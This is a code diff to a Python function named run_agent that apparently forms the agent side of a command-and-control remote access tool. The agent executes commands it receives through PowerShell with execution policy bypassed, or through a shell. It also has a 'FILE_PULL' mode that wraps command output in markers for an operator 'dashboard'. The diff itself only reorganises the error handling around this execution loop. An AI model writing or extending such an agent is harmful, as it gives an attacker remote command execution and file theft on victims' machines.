@@ -57,30 +57,26 @@ def run_agent():
                         print(f"[*] Executing: {command}")
                         
                         # --- ENHANCED EXECUTION LOGIC ---
-                        try:
-                            # Check if this is a File Vault Pull operation
-                            if command.startswith("FILE_PULL|"):
+                        if command.startswith("FILE_PULL|"):
+                            try:
                                 _, file_path, actual_cmd = command.split("|", 2)
-                                
                                 if current_os == "Windows":
                                     full_cmd = ["powershell.exe", "-ExecutionPolicy", "Bypass", "-Command", actual_cmd]
                                     output = subprocess.check_output(full_cmd, stderr=subprocess.STDOUT, shell=True).decode(errors='replace')
                                 else:
                                     output = subprocess.getoutput(actual_cmd)
                                 
-                                # Wrap output in tags so the dashboard auto-detects it
-                                raw_result = f"\nFILE_DATA_START\n{output}\nFILE_DATA_END\n"
-                            
+                                # This is what the dashboard is "listening" for
+                                raw_result = f"FILE_DATA_START\n{output}\nFILE_DATA_END"
+                            except Exception as e:
+                                raw_result = f"File Pull Error: {str(e)}"
+                        else:
+                            # Normal command execution
+                            if current_os == "Windows":
+                                full_cmd = ["powershell.exe", "-ExecutionPolicy", "Bypass", "-Command", command]
+                                raw_result = subprocess.check_output(full_cmd, stderr=subprocess.STDOUT, shell=True).decode(errors='replace')
                             else:
-                                # Standard Command Execution
-                                if current_os == "Windows":
-                                    full_cmd = ["powershell.exe", "-ExecutionPolicy", "Bypass", "-Command", command]
-                                    raw_result = subprocess.check_output(full_cmd, stderr=subprocess.STDOUT, shell=True).decode(errors='replace')
-                                else:
-                                    raw_result = subprocess.getoutput(command)
-                        
-                        except Exception as e:
-                            raw_result = f"Error executing: {str(e)}"
+                                raw_result = subprocess.getoutput(command)
                         # --------------------------------
 
                         # 3. Format Result
